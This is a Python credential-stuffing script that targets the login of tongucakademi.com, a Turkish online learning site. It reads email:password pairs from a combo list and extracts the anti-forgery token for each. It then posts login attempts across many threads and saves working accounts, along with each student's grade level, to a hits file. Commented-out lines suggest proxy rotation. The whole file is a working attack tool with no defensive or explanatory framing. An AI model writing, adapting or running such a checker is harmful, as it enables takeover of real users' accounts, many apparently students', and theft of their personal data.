import requests
import threading
import time
import sys

def combo():
    combos = open(sys.argv[1], encoding='utf-8', errors='ignore').readlines()
    User = []
    Pass = []
    for y in combos:
        ez = y.replace("\n", "").split(":")
        try:
            User.append(ez[0])
            Pass.append(ez[1])
        except BaseException:
            pass
    return User, Pass


def crack(User1, Pass1):
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Pragma": "no-cache",
        "Accept": "*/*"}

    req = requests.session()

    tokencek = req.get(
        "https://www.tongucakademi.com/login",
        headers=headers1).text
        
    tokencekmek1 = tokencek.split(
        '__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    postlink = "https://www.tongucakademi.com/login/login"
    data1 = {
        "Email": str(User1),
        "Parola": str(Pass1),
        "Hatirla": "false",
        "__RequestVerificationToken": f"{tokencekmek1}"
    }
    yollapost = req.post(postlink, data=data1, headers=headers1)
    print(yollapost.content.decode())
    if "Kullanıcı adı veya şifre hatalı" in yollapost.content.decode():
        print(f"Çalışmayan Hesap! | {User1}:{Pass1}")
    elif 'Durum":true,' in yollapost.content.decode():
        capture = req.get(
            "https://tongucakademi.com/profil/bilgilerim",
            headers=headers1)
        sinif = capture.text.split('option selected="" value="')[
            1].split('"')[0]
        print(f"Çalışan Hesap! | {User1}:{Pass1} | {sinif}. Sınıf \n")

        with open("hitst.txt", "a+") as f:
            f.write(f"{User1}:{Pass1} | {sinif}. sınıf \n")


def başlatıcı():
    num=int('0')
    User,Pass=combo()
    threadsnum = sys.argv[2]
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
     #                   randomproxy = proxys3[random.randint(1,len(proxys3))]
     #                   proxsel = {
     #                       'http': 'http://'+randomproxy,
     #                       'https': 'https://'+randomproxy
     #                       }
                    threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                    num += 1
                    #print('Taranmamış user sayısı=',kalan)
                    #kalan -= 1
                else:
                    
                    exit()
                    time.sleep(0.6)
                    
        else:
            #print("Checking done!")
            time.sleep(0.3)
başlatıcı()